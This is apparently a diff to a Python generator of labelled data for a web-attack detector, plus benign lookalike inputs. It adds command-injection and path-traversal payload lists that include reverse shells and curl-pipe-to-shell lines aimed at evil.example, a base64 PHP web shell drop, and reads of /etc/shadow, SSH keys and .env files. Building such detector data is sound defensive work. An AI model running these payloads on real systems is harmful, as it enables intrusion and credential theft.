@@ -281,6 +281,66 @@ def v_versioned_comment(p):
     return " ".join(out)
 
 
+# OS 명령어 삽입: PayloadsAllTheThings "Command Injection"(MIT) 유형을 참고해 직접 작성.
+COMMAND = [
+    "; cat /etc/passwd",
+    "| id",
+    "&& whoami",
+    "`id`",
+    "$(whoami)",
+    "; ls -la /",
+    "|| uname -a",
+    "; sleep 5",
+    "& ping -c 10 127.0.0.1 &",
+    "127.0.0.1; nc -e /bin/sh evil.example 4444",
+    "; bash -i >& /dev/tcp/evil.example/4444 0>&1",
+    "; curl http://evil.example/x.sh | sh",
+    "| wget -qO- http://evil.example/x | bash",
+    ";cat${IFS}/etc/passwd",
+    "|cat$IFS$9/etc/shadow",
+    "& type C:\\Windows\\win.ini",
+    "| powershell -enc SQBFAFgA",
+    "& net user",
+    "\nid",
+    "127.0.0.1\nwhoami",
+    "$(curl evil.example/$(whoami))",
+    "; python3 -c 'import os;os.system(\"id\")'",
+    "a;rm -rf /tmp/x",
+    "| nslookup evil.example",
+    "; echo PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs= | base64 -d > shell.php",
+    "& cmd /c whoami",
+    "`sleep 10`",
+    "; env",
+]
+
+# 경로 조작·파일 포함: PayloadsAllTheThings "Directory Traversal"·"File Inclusion"(MIT) 유형을 참고해 직접 작성.
+PATHS = [
+    "../../../../etc/passwd",
+    "..\\..\\..\\..\\windows\\win.ini",
+    "....//....//....//etc/passwd",
+    "/etc/passwd",
+    "/etc/shadow",
+    "/proc/self/environ",
+    "../../../../../../etc/hosts",
+    "..//..//..//etc/passwd",
+    "../../WEB-INF/web.xml",
+    "../../../.env",
+    "../../../../root/.ssh/id_rsa",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "file:///etc/passwd",
+    "zip://uploads/a.zip#shell.php",
+    "phar://uploads/a.jpg/shell",
+    "expect://id",
+    "../../../../etc/passwd\x00.png",
+    "C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "..%c0%af..%c0%af..%c0%afetc/passwd",
+    "/var/log/apache2/access.log",
+    "....\\\\....\\\\....\\\\windows\\\\win.ini",
+    "../../../../../boot.ini",
+    "/proc/self/cmdline",
+    "php://input",
+]
+
 SQLI_VARIANTS = {
     "raw": v_raw, "url": v_url, "double-url": v_double_url, "mixed-case": v_mixed_case,
     "comment": v_comment, "plus": v_plus, "fullwidth": v_fullwidth,
@@ -295,6 +355,9 @@ XSS_VARIANTS = {
     "url+mixed": v_url_mixed, "double-url+mixed": v_double_url_mixed, "fullwidth+url": v_fullwidth_url,
     "slash-space": v_slash_space, "newline": v_newline,
 }
+CMD_VARIANTS = {"raw": v_raw, "url": v_url, "double-url": v_double_url, "tab": v_tab,
+                "unicode-u": v_unicode_u, "plus": v_plus}
+PATH_VARIANTS = {"raw": v_raw, "url": v_url, "double-url": v_double_url}
 SCR_VARIANTS = {"raw": v_raw, "url": v_url, "double-url": v_double_url, "mixed-case": v_mixed_case,
                 "url+mixed": v_url_mixed, "unicode-u": v_unicode_u, "double-url+mixed": v_double_url_mixed}
 
@@ -305,13 +368,18 @@ TARGETS = {
             ("/api/profile", "bio", "form")],
     "SCR": [("/api/feedback", "message", "json"), ("/", "user-agent", "header"),
             ("/api/search", "q", "query")],
+    "CMD": [("/api/tools/ping", "host", "query"), ("/api/feedback", "message", "json"),
+            ("/api/files", "name", "form")],
+    "PATH": [("/api/download", "file", "query"), ("/api/files", "name", "form"),
+             ("/api/report", "template", "json")],
 }
 
 
 def build_attacks() -> list[dict]:
     rows = []
     for cat, bases, variants in (
-        ("SQLI", SQLI, SQLI_VARIANTS), ("XSS", XSS, XSS_VARIANTS), ("SCR", SCRIPT, SCR_VARIANTS)
+        ("SQLI", SQLI, SQLI_VARIANTS), ("XSS", XSS, XSS_VARIANTS), ("SCR", SCRIPT, SCR_VARIANTS),
+        ("CMD", COMMAND, CMD_VARIANTS), ("PATH", PATHS, PATH_VARIANTS),
     ):
         for i, base in enumerate(bases):
             for j, (vname, fn) in enumerate(variants.items()):
@@ -328,6 +396,10 @@ def build_attacks() -> list[dict]:
                 if vname.startswith("fullwidth") and "&#" in base:
                     continue
                 if cat == "SCR" and vname in ("mixed-case", "url+mixed", "double-url+mixed") and base.startswith("\\x"):
+                    continue
+                if cat == "CMD" and vname in ("tab", "plus") and " " not in base:
+                    continue
+                if cat == "CMD" and vname == "unicode-u" and v_unicode_u(base) == base:
                     continue
                 rows.append({"category": cat, "path": path, "param": param, "location": loc,
                              "variant": vname, "payload": payload, "base": base})
@@ -514,6 +586,39 @@ UAS = [
 ]
 
 
+SHELL_TEXT = [
+    "ls -al 결과에서 숨김 파일만 보고 싶어요",
+    "cat 명령으로 /etc/nginx/nginx.conf 내용을 보면 server 블록이 두 개예요",
+    "cd ../../ 하면 어디로 이동하나요?",
+    "import Button from '../../components/Button' 경로가 자꾸 틀렸다고 나와요",
+    "git log --oneline | head -5 로 최근 커밋만 봅니다",
+    "윈도우에서 C:\\Users\\me\\Documents 폴더가 안 열려요",
+    "docker run -it ubuntu bash 했더니 permission denied",
+    "chmod 755 deploy.sh 후에도 실행이 안 됩니다",
+    "rm -rf node_modules 하고 다시 npm install 했어요",
+    "echo $HOME 이 비어 있는 이유가 뭘까요",
+    "ping 은 되는데 curl 은 타임아웃이 나요",
+    "python3 -m venv .venv 로 가상환경을 만들었어요",
+    "로그는 /var/www/app/storage/logs 에 쌓입니다",
+    "grep -r TODO src | wc -l 로 개수를 셌어요",
+    "sudo systemctl restart nginx 하면 502가 사라져요",
+    "환경 변수는 .env.example 을 복사해서 쓰세요",
+    "find . -name '*.log' -mtime +7 -delete 가 위험한가요?",
+    "tar -czf backup.tar.gz ./data 로 백업했습니다",
+    "ssh-keygen 으로 만든 키를 서버에 등록하는 방법",
+    "PowerShell 에서 Get-ChildItem 결과를 정렬하려면?",
+]
+FILE_NAMES = [
+    "report_2026.pdf", "2026/11/invoice-123.pdf", "images/logo.png", "docs/guide.md", "my file (1).txt",
+    "사진_2026-11-27.jpg", "backup.tar.gz", "data.v2.csv", "templates/email/welcome.html", "README",
+    "a.b.c.d.txt", "assets/fonts/NotoSans-Regular.woff2", "export (final) v3.xlsx", "notes..txt",
+]
+HOSTS = ["127.0.0.1", "8.8.8.8", "example.com", "api.example.co.kr", "10.0.0.12", "2001:db8::1",
+         "my-server.local", "192.168.0.1"]
+SEARCH_CMD_WORDS = ["cat food", "id card", "ping pong", "sleep mask", "echo dot", "curl 헤어", "rm 뜻",
+                    "whoami 명령어", "tom & jerry", "salt & pepper", "a|b 테스트", "black;white"]
+
+
 def build_normals(target: int = 1000, seed: int = 20261125) -> list[dict]:
     rnd = random.Random(seed)
     rows: list[dict] = []
@@ -555,11 +660,21 @@ def build_normals(target: int = 1000, seed: int = 20261125) -> list[dict]:
             text += "\n" + fill(rnd.choice(tpls))
         add(path, param, loc, text, variant)
         i += 1
+    # CMD·PATH 분류를 추가하며 늘린 정상 셋. 앞의 1,000건이 바뀌지 않도록 무작위 채우기 뒤에 붙인다.
+    for t in SHELL_TEXT:
+        add("/api/qna/posts", "content", "json", t, "shell-question")
+    for f in FILE_NAMES:
+        add("/api/download", "file", "query", f, "file-name")
+        add("/api/files", "name", "form", f, "file-name")
+    for h in HOSTS:
+        add("/api/tools/ping", "host", "query", h, "host")
+    for q in SEARCH_CMD_WORDS:
+        add("/api/search", "q", "query", q, "search")
     return rows
 
 
 def write_jsonl(path: Path, rows: list[dict]) -> None:
-    with path.open("w", encoding="utf-8") as fh:
+    with path.open("w", encoding="utf-8", newline="\n") as fh:
         for r in rows:
             fh.write(json.dumps(r, ensure_ascii=False) + "\n")
 
